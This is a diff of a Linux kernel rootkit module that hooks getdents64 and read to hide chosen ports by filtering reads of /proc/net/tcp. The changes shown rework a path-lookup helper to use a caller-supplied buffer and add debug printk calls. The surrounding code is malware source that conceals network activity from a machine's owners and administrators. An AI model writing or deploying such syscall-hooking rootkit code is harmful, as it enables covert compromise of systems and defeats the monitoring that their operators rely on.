@@ -187,18 +187,19 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 	return result;
 }
 
-void getPathnameFromFD(int fd, char *pathname)
+void getPathnameFromFD(int fd, char *pathname, char *buf)
 {
 	struct files_struct *current_files; 
 	struct fdtable *files_table;
 	struct path file_path;
-	char *buf = (char *)kmalloc(GFP_KERNEL,256*sizeof(char));
+	//char *buf = (char *)kmalloc(GFP_KERNEL,256*sizeof(char));
 
 	current_files = current->files;
 	files_table = files_fdtable(current_files);
 
 	file_path = files_table->fd[fd]->f_path;
 	pathname = d_path(&file_path,buf,256*sizeof(char));
+	printk(KERN_INFO "Before %d, %s\n",fd,pathname);
 }
 
 typedef asmlinkage long (*read_ptr)(unsigned int fd, char __user *buf,
@@ -210,7 +211,7 @@ asmlinkage long hacked_read(unsigned int fd, char __user *buf,
 {
 	long result, bp, diff_in_bytes;
 	char *start_line, *end_line, *port_num;
-	char pathname[256];
+	char pathname[256], pbuf[256];
 
 	// run real read 
 	result = (*orig_read)(fd,buf,count);
@@ -224,7 +225,8 @@ asmlinkage long hacked_read(unsigned int fd, char __user *buf,
 	//	return -1;
 
 	// filter out hidden ports if reading /proc/net/tcp
-	getPathnameFromFD(fd,pathname);
+	getPathnameFromFD(fd,pathname,pbuf);
+	printk(KERN_INFO "After %s\n",pathname);
 	if (!strcmp(pathname,"/proc/net/tcp")) {
 		printk(KERN_INFO "Found /proc/net/tcp\n");
 		for (bp = 0; bp < result;) {
